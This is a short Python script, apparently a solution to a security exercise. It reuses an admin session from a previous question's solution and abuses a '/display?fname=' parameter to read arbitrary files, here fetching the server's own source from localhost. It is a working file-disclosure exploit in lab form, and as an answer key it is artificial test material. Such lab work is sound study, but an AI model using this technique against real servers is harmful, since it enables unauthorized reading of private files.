import requests
import solution_q2


def get_file(server_addr, relpath, s):
    return s.get(server_addr + '/display?fname=' + relpath)


def get_server_code(server_addr, s):
    return get_file(server_addr, 'server.py', s)


def solve(server_addr):
    s = solution_q2.make_admin_session(server_addr)
    response = get_server_code(server_addr, s)
    print(response.text)


if __name__ == '__main__':
    solve('http://localhost:8000')

